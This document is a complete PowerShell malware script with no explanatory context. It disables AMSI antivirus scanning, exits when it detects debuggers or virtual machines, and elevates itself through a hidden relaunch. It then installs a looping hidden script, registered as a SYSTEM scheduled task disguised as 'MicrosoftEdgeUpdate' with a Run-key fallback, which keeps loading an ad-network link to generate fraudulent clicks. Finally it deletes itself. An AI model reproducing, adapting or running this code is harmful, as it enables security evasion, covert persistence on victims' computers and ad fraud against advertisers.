$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
try{[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").GetValue($null),0x01)}catch{}
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]0)}catch{}
if([System.Diagnostics.Debugger]::IsAttached){exit}
$vmProcs=@('vboxservice','vboxtray','vmwaretray','vmtoolsd','xenservice')
foreach($p in $vmProcs){if(Get-Process $p -EA 0){exit}}
if((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*"){exit}
$isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if(-not $isAdmin){
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName="powershell.exe"
    $psi.Arguments="-NoP -NonI -W Hidden -Exec Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    $psi.Verb="runas"
    [System.Diagnostics.Process]::Start($psi)|Out-Null;exit
}
$lockPath="$env:APPDATA\Microsoft\Windows\swill.lock"
if(Test-Path $lockPath){exit}
New-Item $lockPath -Force|Out-Null
$smartlink="https://www.profitablecpmratenetwork.com/ui63ybej16?key=65bc28f91ecb56970211c61fc28fd009"
$regPath="HKCU:\Software\Microsoft\Internet Explorer\Main"
Set-ItemProperty -Path $regPath -Name "DisableFirstRunCustomize" -Value 1 -Force -EA 0
Set-ItemProperty -Path $regPath -Name "DisableWelcomeScreen" -Value 1 -Force -EA 0
function Click-Website {
    try{
        $ie=New-Object -ComObject InternetExplorer.Application
        $ie.Visible=$false
        $ie.Silent=$true
        $ie.Navigate($smartlink)
        for($i=0;$i -lt 30;$i++){
            if($ie.ReadyState -eq 4){break}
            Start-Sleep -Milliseconds 200
        }
        Start-Sleep -Milliseconds (Get-Random -Min 3000 -Max 8000)
        $ie.Quit()
    }catch{}
    try{
        $wc=New-Object Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
        $wc.DownloadString($smartlink)|Out-Null
    }catch{}
}
$randNum=Get-Random -Min 1000 -Max 9999
$persistScript="@
`$ErrorActionPreference='SilentlyContinue'
`$url='$smartlink'
while(`$true){
    try{
        `$ie=New-Object -ComObject InternetExplorer.Application
        `$ie.Visible=`$false
        `$ie.Silent=`$true
        `$ie.Navigate(`$url)
        for(`$i=0;`$i -lt 30;`$i++){
            if(`$ie.ReadyState -eq 4){break}
            Start-Sleep -Milliseconds 200
        }
        Start-Sleep -Milliseconds (Get-Random -Min 3000 -Max 8000)
        `$ie.Quit()
    }catch{}
    try{
        `$wc=New-Object Net.WebClient
        `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
        `$wc.DownloadString(`$url)|Out-Null
    }catch{}
    Start-Sleep -Seconds (Get-Random -Min 45 -Max 180)
}
"
$persistPath="$env:APPDATA\Microsoft\Windows\p_$randNum.ps1"
$persistScript|Out-File $persistPath -Encoding ASCII -Force
schtasks /create /tn "MicrosoftEdgeUpdate_$randNum" /tr "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$persistPath`"" /sc onstart /ru SYSTEM /f 2>$null
if($LASTEXITCODE -ne 0){
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate_$randNum" -Value "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$persistPath`"" -Force -EA 0
}
Click-Website
Get-ChildItem "$env:TEMP\svc*.ps1" -EA 0|Remove-Item -Force -EA 0
Remove-Item $MyInvocation.MyCommand.Path -Force -EA 0
